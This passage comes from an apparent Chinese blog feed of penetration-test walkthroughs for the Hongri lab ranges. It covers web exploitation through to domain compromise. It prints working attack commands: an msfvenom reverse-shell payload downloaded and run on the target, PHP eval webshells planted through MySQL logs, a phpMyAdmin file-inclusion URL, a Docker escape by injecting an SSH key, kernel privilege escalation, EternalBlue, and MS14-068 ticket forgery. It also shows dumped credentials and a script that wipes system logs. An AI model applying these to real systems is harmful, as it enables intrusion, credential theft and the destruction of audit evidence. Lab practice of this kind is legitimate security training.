“Whoami2021” /user:”Administrator”<img src="https://api2.mubu.com/v3/document_image/531f5605-1539-4ae8-9446-ac1d57c1b455-11763069.jpg" alt="img"></li></ul></li><li><p>连上了  然后来关防火墙</p><ul><li><p>sc \192.168.93.30 create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p></li><li><p>sc \192.168.93.30 start unablefirewall<img src="https://api2.mubu.com/v3/document_image/9b1cbc31-dac0-4304-b101-5ee0b6cef233-11763069.jpg" alt="img"></p></li></ul></li><li><p>然后在次尝试psexec<img src="https://api2.mubu.com/v3/document_image/80f8f656-3d33-46fb-953d-1a4116bd15d4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a8247a24-0583-4413-99cc-889ba16bd1ff-11763069.jpg" alt="img"></p></li><li><p>拿下域控 到此拿下了所有机器  </p></li><li><p>权限维持就不做了</p></li><li><p>后记 最后想了一下其他思路 因为第二层的网络是出网的所以可以直接上线cs 在cs上操作 也是可以的</p></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日4</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A54/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A54/</url>
    
    <content type="html"><![CDATA[<ul><li><h2 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图<img src="https://api2.mubu.com/v3/document_image/c5bc413d-e040-4255-a19c-0a061c6bea68-11763069.jpg" alt="img"></h2></li><li><p>直接开干</p></li><li><p>先进入ubuntu启动web</p></li><li><p>先开启3个环境<img src="https://api2.mubu.com/v3/document_image/717e8e04-f23e-4157-a8e4-ae6be7b5b865-11763069.jpg" alt="img"></p></li><li><p>命令：</p><ul><li><p>cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</p></li><li><p>sudo docker-compose up -d</p></li><li><p>cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</p></li><li><p>sudo docker-compose up -d</p></li><li><p>cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</p></li><li><p>sudo docker-compose up -d</p></li></ul></li><li><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li><li><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><ul><li><p>nmap扫描发现目标主机</p><ul><li><p>nmap -sS -T4 192.168.1.0/24 <img src="https://api2.mubu.com/v3/document_image/128352ed-b704-4125-ade4-80b1f303b4f9-11763069.jpg" alt="img"></p></li><li><p>发现目标：192.168.1.10 除了22端口 2001-2003全是web服务</p></li></ul></li></ul></li><li><h3 id="二、web入侵"><a href="#二、web入侵" class="headerlink" title="二、web入侵"></a>二、web入侵</h3><ul><li><p>1、Struts2框架漏洞Getshell</p><ul><li><p>先打开2001端口的web<img src="https://api2.mubu.com/v3/document_image/eae9428b-197b-46e0-9c8d-c77453a88545-11763069.jpg" alt="img"></p></li><li><p>是一个上传界面  </p></li><li><p>我们先随便上传一个文件</p></li><li><p>上传之后发现后缀是.action的<img src="https://api2.mubu.com/v3/document_image/c6a7e03f-9b0b-4b6e-bf5c-5e141ce226f8-11763069.jpg" alt="img"></p></li><li><p>推测是struts2框架</p></li><li><p>然后使用漏洞工具探测一波<img src="https://api2.mubu.com/v3/document_image/fae03b54-a190-47a5-bb42-f8fb59a5154c-11763069.jpg" alt="img"></p></li><li><p>发现存在漏洞 且可执行命令  用msf上线</p></li><li><p>先在kali上生成msf木马 然后开一个http服务 将马放在服务上 供目标远程下载 因为目标出网</p><ul><li><p>命令：</p><ul><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.96 LPORT=6666 -f elf &gt; shell.elf</p></li><li><p>python -m SimpleHTTPServer 80</p></li></ul></li></ul></li><li><p>然后目标远程下载 执行下载命令</p><ul><li><p>命令：</p><ul><li>wget <a href="http://192.168.1.11/shell.elf">http://192.168.1.11/shell.elf</a></li></ul></li><li><p><img src="https://api2.mubu.com/v3/document_image/69a59434-c915-4672-94ac-22d313dea47d-11763069.jpg" alt="img"></p></li></ul></li><li><p>然后msf开启监听</p><ul><li><p>命令：</p><ul><li><p>use exploit/multi/handler</p></li><li><p>set lhost 0.0.0.0</p></li><li><p>set lport 6666</p></li><li><p>set payload linux/x86/meterpreter/reverse_tcp</p></li><li><p>run</p></li></ul></li></ul></li><li><p>然后在目标上执行shell.elf  先给权限<img src="https://api2.mubu.com/v3/document_image/64fe8287-bf41-4a96-8d6e-f575ae1805a6-11763069.jpg" alt="img"></p></li><li><p>然后执行<img src="https://api2.mubu.com/v3/document_image/6d0d4773-bd0e-4aaa-aa6e-c4607f85068e-11763069.jpg" alt="img"></p></li><li><p>然后kali 收到会话<img src="https://api2.mubu.com/v3/document_image/466511ea-a15a-43e7-8188-5832d0dd2a5d-11763069.jpg" alt="img"></p></li><li><p>发现是172开头的<img src="https://api2.mubu.com/v3/document_image/d0a84d94-6c60-4271-81d9-760d4a271974-11763069.jpg" alt="img"></p></li><li><p>怀疑是docker 先判断一波</p></li><li><p>用命令 cat  /proc/1/cgroup<img src="https://api2.mubu.com/v3/document_image/8b0c6830-d270-4059-981a-b2ff057b249b-11763069.jpg" alt="img"></p></li><li><p>判断docker方法：</p><ul><li><p>1、使用下面命令，查看是否存在 dockerrnv 文件  ls -alh /.dockerenv</p></li><li><p>2、查看系统进程的cgroup信息  cat /proc/1/cgroup</p></li></ul></li><li><p>确定是在docker中 所以进行docker逃逸</p></li></ul></li><li><p>2、Tomcat任意文件上传（CVE-2017-12615）Getshell</p><ul><li><p>打开2002端口  是一个tomcat页面 版本是8.5.19<img src="https://api2.mubu.com/v3/document_image/c9b6f85e-db58-4750-9c99-22c11e87b208-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/ccd220aa-b63c-4ac3-b2d7-b98c1529ac47-11763069.jpg" alt="img"></p></li><li><p>尝试put方法拿shell<img src="https://api2.mubu.com/v3/document_image/63c65591-4cb6-4ae6-8244-bcb3bc42ae7a-11763069.jpg" alt="img"></p></li><li><p>冰蝎连接<img src="https://api2.mubu.com/v3/document_image/cb8667e8-8c57-4228-8ff5-7b9c766990a7-11763069.jpg" alt="img"></p></li><li><p>成功getshell</p></li></ul></li><li><p>3、PhPMyadmin <code>CVE-2018-12613</code> Getshell</p><ul><li><p>访问2003端口 是一个phpmyadmin<img src="https://api2.mubu.com/v3/document_image/98ed543e-d6f8-4f36-8988-947f25d21a39-11763069.jpg" alt="img"></p></li><li><p>尝试日志文件Getshell</p><ul><li><p>尝试将general log改为yes，提醒我们没有权限,好吧，日志文件getshell这条路是行不通了<img src="https://api2.mubu.com/v3/document_image/117b947d-afc7-48c7-85cc-717258316ca5-11763069.jpg" alt="img"></p></li><li><p>利用百度搜索发现，phpmyadmin4.8.1后台存在漏洞CVE-2018-12613，利用Poc验证本服务器是否存在</p><ul><li><a href="http://192.168.1.10:2003/index.php?target=db_sql.php?/../../../../../../../../etc/passwd">http://192.168.1.10:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></li></ul></li><li><p>成功包含，存在此漏洞</p></li><li><p>漏洞利用</p><ul><li><p>1.利用SQL查询查询 select ‘<?php eval($_POST['cmd']);?>‘,将查询后的网页cookie</p></li><li><p>phpmyadmin:f29ab8338e5bebece0edf526c14416c4记录</p></li><li><p>2.包含Php-session文件getshell</p></li><li><p><img src="https://api2.mubu.com/v3/document_image/20e1f5fc-8fec-4305-b613-5ed5de08577e-11763069.jpg" alt="img"></p></li></ul></li></ul></li></ul></li></ul></li><li><h3 id="三、Docker逃逸"><a href="#三、Docker逃逸" class="headerlink" title="三、Docker逃逸"></a>三、Docker逃逸</h3><ul><li><p>利用fdisk -l 查看挂载盘<img src="https://api2.mubu.com/v3/document_image/576cf65f-db61-49f8-8213-7482fc8464e5-11763069.jpg" alt="img"></p></li><li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上</p></li><li><p>mkdir  shell</p></li><li><p>mount /dev/sda1  shell       </p></li><li><p>挂载成功，我们此时可以查看、修改宿主机的某些文件了。<img src="https://api2.mubu.com/v3/document_image/b4141f6c-6515-44cc-9cf3-34580824ebb8-11763069.jpg" alt="img"></p></li><li><p>写入ssh密钥进行docker逃逸</p><ul><li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/312deac6-9689-4299-90c5-aa4fb74f1e50-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/b260adb4-0530-4fc2-86d3-efd98beb9643-11763069.jpg" alt="img"></p></li><li><p>然后将密钥复制</p></li><li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/8b39a503-a8e6-4b65-a501-ec351459ae9b-11763069.jpg" alt="img"></p></li><li><p>命令：</p><ul><li><p>cp -avx /shell/home/ubuntu/.ssh/id_rsa.pub /shell/home/ubuntu/.ssh/authorized_keys</p></li><li><p>echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW0uc8noTdYQIrZo5ODN0AyB4tmZlTF8mwxeVxccWCxrUkVwjhcfcmGq3czbgncMUoYh5vB1jWZSnakVfc4pAx3Yg/G4HVKu1q0JkCqrz8c1VJOpQAWoVjw8gCXpBk1rizX5nS4lkHAfZVJ0gb4grTGK31F+vbhN3OLIqteyUN7kJzWvvhD/iUiEDqVFKzllXIZGTr+kZioZfSxCJEZuI6ARbRDnKM/YHcdlfy0k64bYwWquCV8jxZOC5CYGr9Q6gPEO17a1szkNyTOGWNYk/oDQ2UpOT/PjObE3xk8eQrqnZFHQL23vTou3XOXoSp0C3DEdkr8aYE5bGUoet5n82QzZZixxCQIpuRvtvLHCQlBMiJZEB97gtivFZJXbFxV1QJpbrQDO/Q+HZTGH4rZnFMADDjbFhtWlb/uQqkZr38/hX7JxI8oewZcTKrF7tgc3jE/R33c/8OqNoYdv7LKqP//m7CEVUFE99GH5N+I3H8z6bQnARRhQ/1jKYLmK4+jXk= root@kali’ &gt; /hack/home/ubuntu/.ssh/authorized_keys</p></li><li><p>cat /hack/home/ubuntu/.ssh/authorized_keys</p></li></ul></li><li><p>然后用kali连接ubuntu</p><ul><li>这里要注意连接的时候需要根据生成key时候的名字 hack<img src="https://api2.mubu.com/v3/document_image/d5e4a5f6-5d05-42df-b871-4b20e74485dc-11763069.jpg" alt="img"></li></ul></li></ul></li><li><p>ubuntu提权</p><ul><li><p>先查看版本<img src="https://api2.mubu.com/v3/document_image/0b57b0f1-21b2-477d-8bff-88a567231590-11763069.jpg" alt="img"></p></li><li><p>根据志哥的wp  发现有一个新的exp可以提权  CVE-2021-3493</p></li><li><p>   EXP下载地址：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p></li><li><p>影响版本</p><ul><li><p>Ubuntu 20.10</p></li><li><p>Ubuntu 20.04 LTS</p></li><li><p>Ubuntu 18.04 LTS</p></li><li><p>Ubuntu 16.04 LTS</p></li><li><p>Ubuntu 14.04 ESM</p></li></ul></li><li><p>编译并上传到服务器exp</p><ul><li><p>gcc exploit -o exp</p></li><li><p>python3 -m http.server 80</p></li><li><p>chmod 777 exp </p></li><li><p>./exp 失败…推测环境不一致导致编译后无法在目标主机环境运行，上传exploit.c，尝试在服务器上编译使用    <img src="https://api2.mubu.com/v3/document_image/8104228c-7cb4-4b59-ad21-8b02505563ad-11763069.jpg" alt="img"></p></li><li><p> <a href="http://192.168.1.11/exploit.c">http://192.168.1.11:80/exploit.c</a><img src="https://api2.mubu.com/v3/document_image/e65c87f4-15a9-452c-af25-145c6be53472-11763069.jpg" alt="img"></p></li><li><p>gcc exploit.c -o exp</p></li><li><p>./exp   <img src="https://api2.mubu.com/v3/document_image/9024fa8f-6490-4dc7-a005-327dc52f9085-11763069.jpg" alt="img"></p></li><li><p>然后重新弹一个root的shell回去<img src="https://api2.mubu.com/v3/document_image/f4ed57f4-3e1a-4ea3-a860-73b56b6d6d84-11763069.jpg" alt="img"></p></li></ul></li></ul></li></ul></li><li><h3 id="四、内网横向"><a href="#四、内网横向" class="headerlink" title="四、内网横向"></a>四、内网横向</h3><ul><li><p>发现路由<img src="https://api2.mubu.com/v3/document_image/b28c7c9f-ca4e-4e0c-8588-57e88974b63a-11763069.jpg" alt="img"></p></li><li><p>添加路由 命令：run autoroute -s 192.168.183.0/24<img src="https://api2.mubu.com/v3/document_image/38f48706-40e6-48cd-8664-6e7ce274b3d5-11763069.jpg" alt="img"></p></li><li><p>开启socks代理</p><ul><li><p> use auxiliary/server/socks_proxy    </p></li><li><p>set srvhost 192.168.1.11</p></li><li><p>set version 4a socks版本   </p></li><li><p> run    </p></li></ul></li><li><p>信息收集 探测存存活主机</p><ul><li><p> use auxiliary/scanner/smb/smb_version </p></li><li><p>set rhosts 192.168.183.0/24</p></li><li><p>set timestampoutput 5 设置最大超时时间为5s</p></li><li><p>发现两个存活主机 以及域名demo<img src="https://api2.mubu.com/v3/document_image/2f519aad-d242-4911-9eae-591b24a81286-11763069.jpg" alt="img"></p></li></ul></li><li><p>探测主机存活端口</p><ul><li><p>use auxiliary/scanner/portscan/tcp</p></li><li><p>set ports 135,445,80,443,1433,3306,53,8080,8888,7001 # 将常用端口添加并扫描set rhosts 192.168.183.130-131    #探测两台服务器          </p></li><li><p>130开了53 135 445<img src="https://api2.mubu.com/v3/document_image/7f8093b1-0443-46c4-808d-bac29a695b28-11763069.jpg" alt="img"></p></li><li><p>131开了135 445<img src="https://api2.mubu.com/v3/document_image/171dfb79-66b7-4b37-a68f-01768149fc23-11763069.jpg" alt="img"></p></li><li><p>因为都开 了135 445  用永恒之蓝扫一波</p></li></ul></li><li><p>永恒之蓝</p><ul><li><p>use auxiliary/scanner/smb/smb_ms17_010</p></li><li><p>set payload windows/x64/meterpreter/bind_tcp              </p></li><li><p>set rhosts 192.168.183.130-131</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/c7336ed3-1afe-4772-9b64-a5a27caed7da-11763069.jpg" alt="img"></p></li><li><p>看样子两台都可能有  先打131</p><ul><li>这里图贴错了 不影响</li></ul></li><li><p>拿下131<img src="https://api2.mubu.com/v3/document_image/fbca5c61-d359-45a5-99cc-b371f00ec2a4-11763069.jpg" alt="img"></p></li><li><p>开始域内信息收集:<img src="https://api2.mubu.com/v3/document_image/b6a67bf2-9f20-497f-a955-e3d7c72a1924-11763069.jpg" alt="img"></p></li><li><p>但执行域内信息收集的时候出现问题  一直报错<img src="https://api2.mubu.com/v3/document_image/1159a092-435c-41b3-83ee-fa2dace1d80e-11763069.jpg" alt="img"></p></li><li><p>通过问志哥发现  说是当前用户不在域内 换一个用户收集</p></li><li><p>通过systeminfo发现当前是pc机  还有一个机器应该就是域控<img src="https://api2.mubu.com/v3/document_image/9784e981-e4a2-4388-ab0a-badc7b59574a-11763069.jpg" alt="img"></p></li><li><p>先进行进程迁移到一个域用户<img src="https://api2.mubu.com/v3/document_image/b65c4c1e-059b-4a1d-ace3-dac986593164-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/9732fc4a-b7ba-449e-9899-8a14524ce3cd-11763069.jpg" alt="img"></p></li><li><p>迁移成功</p></li><li><p>现在就能成功进行相关的域信息收集<img src="https://api2.mubu.com/v3/document_image/c7a82ae6-f7c8-4cbf-b198-8ccd2e75c46f-11763069.jpg" alt="img"></p></li><li><p>找到域控机器<img src="https://api2.mubu.com/v3/document_image/c26457a2-9757-4cf1-bcbb-b6837c848586-11763069.jpg" alt="img"></p></li><li><p>ip 192.168.183.130</p></li><li><p> DC机器名：<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>      </p></li><li><p> 域管用户 administrator                      </p></li><li><p>域用户sid</p><ul><li>demo\douser S-1-5-21-979886063-1111900045-1414766810-1107</li></ul></li><li><p>切换回高权限  然后用kiwi抓取密码<img src="https://api2.mubu.com/v3/document_image/cb954d28-1f29-4877-a7cd-2d8cd9c9ae64-11763069.jpg" alt="img"></p></li><li><p>抓取到了域用户的明文密码和hash 但是没有抓到域管的</p><ul><li>douser:Dotest123ntml:bc23b0b4d5bf5ff42bc61fb62e13886e sha1:c48096437367aad00ac2dc70552051cd84912a55      </li></ul></li><li><p>  使用smb连接了 但是无法执行命令<img src="https://api2.mubu.com/v3/document_image/0f41dfd0-67b9-44e2-b16e-49b639e4256f-11763069.jpg" alt="img"></p></li><li><p>所以利用ms14-068域内漫游</p></li><li><p>切换到域用户然后上传exe </p></li><li><p>然后执行 利用ms14-068生成票据：               ms14-068.exe -u <a href="mailto:&#100;&#x6f;&#117;&#115;&#x65;&#114;&#x40;&#x64;&#x65;&#109;&#x6f;&#x2e;&#99;&#x6f;&#109;">&#100;&#x6f;&#117;&#115;&#x65;&#114;&#x40;&#x64;&#x65;&#109;&#x6f;&#x2e;&#99;&#x6f;&#109;</a> -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123          <img src="https://api2.mubu.com/v3/document_image/be7b8f35-6263-4f0a-ba28-102392b12289-11763069.jpg" alt="img"></p></li><li><p>​    然后利用mimiaktz将凭据导入内存<img src="https://api2.mubu.com/v3/document_image/491d3c22-f25e-4712-94dd-714749e16453-11763069.jpg" alt="img"></p></li><li><p>这里需要先清除目标的凭据</p><ul><li><p>mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p></li><li><p>mimikatz # kerberos::list          //查看当前机器凭证</p></li><li><p>mimikatz # kerberos::ptc &lt;生成的票据文件&gt;   //将票据注入到内存中</p></li></ul></li><li><p>mimikatz # kerberos::ptc <a href="mailto:&#84;&#x47;&#x54;&#95;&#100;&#x6f;&#x75;&#115;&#x65;&#x72;&#64;&#100;&#x65;&#x6d;&#111;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;">&#84;&#x47;&#x54;&#95;&#100;&#x6f;&#x75;&#115;&#x65;&#x72;&#64;&#100;&#x65;&#x6d;&#111;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;</a>              </p></li><li><p>然后dir \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>\c$<img src="https://api2.mubu.com/v3/document_image/a2a8fd70-b98e-4460-8762-fb9be9f61072-11763069.jpg" alt="img"></p></li><li><p>凭据生效</p></li></ul></li><li><p>漫游DC</p><ul><li><p>先生成一个正向的shell 上传到pc win7上  然后copy到dc上<img src="https://api2.mubu.com/v3/document_image/a4d02b57-33f6-4c4f-8dc3-d6b489721ffb-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/16d1dde2-d344-4de4-9e35-f09ea9d3e835-11763069.jpg" alt="img"></p></li><li><p>关闭dc防火墙</p></li><li><p>sc \WIN-ENS2VR5TR3N create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p></li><li><p>sc \WIN-ENS2VR5TR3N start unablefirewall<img src="https://api2.mubu.com/v3/document_image/7b4eb2f7-067d-4578-bd14-fdcd50a258e0-11763069.jpg" alt="img"></p></li><li><p>然后将bind.exe传到dc<img src="https://api2.mubu.com/v3/document_image/c8ad58eb-d16a-420f-ae88-0213d8ad38b0-11763069.jpg" alt="img"></p></li><li><p>msf创建监听<img src="https://api2.mubu.com/v3/document_image/1379641e-1bd1-4ddd-965b-c6f94d0fcadc-11763069.jpg" alt="img"></p></li><li><p>创建服务执行msf马：</p><ul><li> sc \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> create shell binpath= “c:\bind.exe”    创建执行正向shell的进程sc \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> start shell        启动可以执行正向shell的服务       </li></ul></li><li><p>不知道是我的操作问题 还是环境问题 我一直出毛病</p></li><li><p>最后始终连不上       <img src="https://api2.mubu.com/v3/document_image/6ae49381-98a3-4f66-a260-a9c76f20f010-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/1722bc09-2e1c-4cf3-840a-ca056b9c6fe5-11763069.jpg" alt="img"></p></li><li><p>后面的操作 也没多难 执行拿下dc 抓hash 抓密码等 就不继续操作了</p></li></ul></li></ul></li><li><h3 id="五、痕迹清理"><a href="#五、痕迹清理" class="headerlink" title="五、痕迹清理"></a>五、痕迹清理</h3><ul><li><p>Linux</p><ul><li><p>清除命令历史记录</p></li><li><p>histroy -r          #删除当前会话历史记录</p></li><li><p>history -c          #删除内存中的所有命令历史</p></li><li><p>rm .bash_history   #删除历史文件中的内容</p></li><li><p>HISTZISE=0          #通过设置历史命令条数来清除所有历史记录</p></li><li><p>在隐蔽的位置执行命令</p></li><li><p>使用vim打开文件执行命令</p></li><li><p>:set history=0</p></li><li><p>:!command</p></li><li><p>linux日志文件</p></li><li><p>/var/run/utmp 记录现在登入的用户</p></li><li><p>/var/log/wtmp 记录用户所有的登入和登出</p></li><li><p>/var/log/lastlog 记录每一个用户最后登入时间</p></li><li><p>/var/log/btmp 记录错误的登入尝试</p></li><li><p>/var/log/auth.log 需要身份确认的操作</p></li><li><p>/var/log/secure 记录安全相关的日志信息</p></li><li><p>/var/log/maillog 记录邮件相关的日志信息</p></li><li><p>/var/log/message 记录系统启动后的信息和错误日志</p></li><li><p>/var/log/cron 记录定时任务相关的日志信息</p></li><li><p>/var/log/spooler 记录UUCP和news设备相关的日志信息</p></li><li><p>/var/log/boot.log 记录守护进程启动和停止相关的日志消息</p></li><li><p>完全删除日志文件：</p></li><li><p>cat /dev/null &gt; filename</p></li><li><p>: &gt; filename</p></li><li><p>&gt; filename</p></li><li><p>echo “” &gt; filename</p></li><li><p>echo &gt; filename</p></li><li><p>针对性删除日志文件：</p></li><li><p>删除当天日志</p></li><li><p>sed  -i ‘/当天日期/‘d  filename</p></li><li><p>一键清除脚本：</p></li><li><p>#!/usr/bin/bash</p></li><li><p>echo &gt; /var/log/syslog</p></li><li><p>echo &gt; /var/log/messages</p></li><li><p>echo &gt; /var/log/httpd/access_log</p></li><li><p>echo &gt; /var/log/httpd/error_log</p></li><li><p>echo &gt; /var/log/xferlog</p></li><li><p>echo &gt; /var/log/secure</p></li><li><p>echo &gt; /var/log/auth.log</p></li><li><p>echo &gt; /var/log/user.log</p></li><li><p>echo &gt; /var/log/wtmp</p></li><li><p>echo &gt; /var/log/lastlog</p></li><li><p>echo &gt; /var/log/btmp</p></li><li><p>echo &gt; /var/run/utmp</p></li><li><p>rm ~/./bash_history</p></li><li><p>history -c</p></li></ul></li><li><p>Windows</p><ul><li><p>1.查看事件日志run event_manager -i</p></li><li><p>2.删除事件日志run event_manager -c</p></li><li><p>3.clearv命令清除目标系统的事件日志。</p></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日1</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A51/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A51/</url>
    
    <content type="html"><![CDATA[<ul><li><h3 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图</h3></li><li><p><img src="https://api2.mubu.com/v3/document_image/ce7ddd3f-7c6b-4763-81dc-928d373c4210-11763069.jpg" alt="img"></p></li><li><p>靶场环境  win7 是web服务器  2003 是域成员   2008是域控</p></li><li><p>添加一个网卡<img src="https://api2.mubu.com/v3/document_image/1110999a-0830-44ce-9843-fed59fcd7e34-11763069.jpg" alt="img"></p></li><li><p>win7是双网卡 一个桥接  一个52网段的网卡 另外两个都是52网段的网卡</p></li><li><h3 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h3><ul><li><p>输入web服务器ip  打开是一个php探针页面</p><ul><li><p>通过这个页面可以 看到绝对路径 服务器信息  搭建的phpstydy版本  以及可以在最下面进行mysql数据库的连接测试<img src="https://api2.mubu.com/v3/document_image/e08519a6-4bc3-494a-96d6-7c111e5329af-11763069.jpg" alt="img"></p></li><li><p>发现是php探针  就会联想到 phpmyadmin  一般这种是联合搭配的  直接在页面输入phpmyadmin进行测试<img src="https://api2.mubu.com/v3/document_image/b3f4e125-46b9-449a-8be5-9522e80f0b76-11763069.jpg" alt="img"></p></li><li><p>直接进到phpmyadmin界面  然后就可以用 弱口令进行测试 root  root<img src="https://api2.mubu.com/v3/document_image/10d6950b-de02-403a-89f3-8fde81b901f7-11763069.jpg" alt="img"></p></li><li><p>进到phpmyadmin里面 我们就可以通过phpmyadmin拿webshell了</p></li><li><p>先直接通过mysql 试试导入一句话</p></li><li><p>执行之后发现报错<img src="https://api2.mubu.com/v3/document_image/52a584a1-0f7b-4148-8f88-3eab30103256-11763069.jpg" alt="img"></p></li><li><p>然后翻译一下报错信息<img src="https://api2.mubu.com/v3/document_image/bac7ea1e-9123-4f3d-86a9-1d25df775ccf-11763069.jpg" alt="img"></p></li><li><p>发现是secure file priv  然后使用命令查看一下secure的设置<img src="https://api2.mubu.com/v3/document_image/2c9eaf0e-f235-44b8-9b5a-ce9e3230bfd4-11763069.jpg" alt="img"></p></li><li><p>发现secure file priv   是null  上面是off   这样设置是不允许导入文件的 只能读  所以我们可以尝试写全局日志的方式进行getshell</p></li><li><p>先用命令查看日志的配置 show global variables like ‘%general_%’<img src="https://api2.mubu.com/v3/document_image/297a0451-f640-4b43-b322-2783ea9101e4-11763069.jpg" alt="img"></p></li><li><p>可以看到 全局日志是关闭的  和全局日志的记录位置   所以接下来就需要将全局日志打开  然后将路径也改了</p></li><li><p>打开日志 命令：set global general_log = on<img src="https://api2.mubu.com/v3/document_image/b28974fa-554e-44a2-ad8f-19ac1cd77f16-11763069.jpg" alt="img"></p></li><li><p>修改路径 命令 set global general_log_file = ‘C:/phpStudy/WWW/hack.php’<img src="https://api2.mubu.com/v3/document_image/6c5b95c7-2aba-4afe-b47f-62b3044d0c65-11763069.jpg" alt="img"></p></li><li><p>然后进行一句话写入 命令 ： select “<?php eval($_POST['cmd']);?>“<img src="https://api2.mubu.com/v3/document_image/6d8dac8b-e137-417b-b077-3a05ba03afcb-11763069.jpg" alt="img"></p></li><li><p>然后打开靶机看一看 效果<img src="https://api2.mubu.com/v3/document_image/97e6c4fb-bba0-48d0-b0dc-7a44a13c760a-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/f9159448-e645-4ace-b245-b54d51bb0cc4-11763069.jpg" alt="img"></p></li><li><p>一句话成功写入  打开蚁剑 进行连接<img src="https://api2.mubu.com/v3/document_image/8420c81d-6725-4fc4-b4c5-b193ba3b7058-11763069.jpg" alt="img"></p></li><li><p>成功连接   webshell 拿下</p></li><li><p>发现还有一个yxcms的 应该是有一个页面的  用浏览器打开<img src="https://api2.mubu.com/v3/document_image/55db3e09-09e5-4d80-9a0f-9b5c41f38d31-11763069.jpg" alt="img"></p></li><li><p>因为是靶场的缘故 直接告诉了后台地址和用户账号密码  正常情况下 是没有这些的 需要通过常规的渗透手段 进行获取  因为有了地址和密码 就直接登录后台<img src="https://api2.mubu.com/v3/document_image/b0f83ce1-4942-4b04-8560-ab0c84f9d0c1-11763069.jpg" alt="img"></p></li><li><p>然后首先就是看看有什么地方可以getshell</p></li><li><p>发现sql执行   root权限  就可以和上面一样  试试直接写入一句话  或者 用全日志写入一句话<img src="https://api2.mubu.com/v3/document_image/64bf056a-e3c2-4f21-9904-6dcfc5c71b73-11763069.jpg" alt="img"></p></li><li><p>在看看其他地方  发现模板<img src="https://api2.mubu.com/v3/document_image/fcea861a-e446-40d9-b2a8-0e1b97627f01-11763069.jpg" alt="img"></p></li><li><p>这里我们可以修改一个模板 插入一句话  或者新建一个  插入大马 或小马行</p></li><li><p>新建一个小马<img src="https://api2.mubu.com/v3/document_image/948c4052-a354-4339-861c-dfde7471bcd3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/473ea7ad-e557-4a19-835c-806d71e0ce1f-11763069.jpg" alt="img"></p></li><li><p>模板创建好后  接下来的问题就是 找到路径</p></li><li><p>在后台 发现无法找到路径   换个思路 通过御剑扫描目录 看看有木有新发现<img src="https://api2.mubu.com/v3/document_image/ac872fa7-ac81-4a78-a3b4-ee8b86216b9f-11763069.jpg" alt="img"></p></li><li><p>发现一个目录遍历  然后可以查看目录 找到 创建的模板路径<img src="https://api2.mubu.com/v3/document_image/284c8ff1-65c2-4f0d-adab-2c8d54cd6463-11763069.jpg" alt="img"></p></li><li><p>直接扫描域名   发现有备份文件  也可以直接下载备份文件 查找路径<img src="https://api2.mubu.com/v3/document_image/1e56a8fe-1211-4420-88e9-0a49c21cda31-11763069.jpg" alt="img"></p></li><li><p>找到路径之后 直接用蚁剑进行连接<img src="https://api2.mubu.com/v3/document_image/8d56995b-2491-4075-83fa-394a97663b95-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/d250eb4a-cf09-4c4f-ae20-e74e11b3ef4e-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a2b2522a-b0de-4690-bcb2-11e845dd6fa8-11763069.jpg" alt="img"></p></li><li><p>这样 也可以getshell</p></li><li><p>拿下webshell执行 就该进行内网渗透</p></li></ul></li><li><h3 id="内网实现"><a href="#内网实现" class="headerlink" title="内网实现"></a>内网实现</h3><ul><li><p>发现权限是administrator 权限挺高 就不需要提权了  然后是Windows系统  可以结合cs 上线操作<img 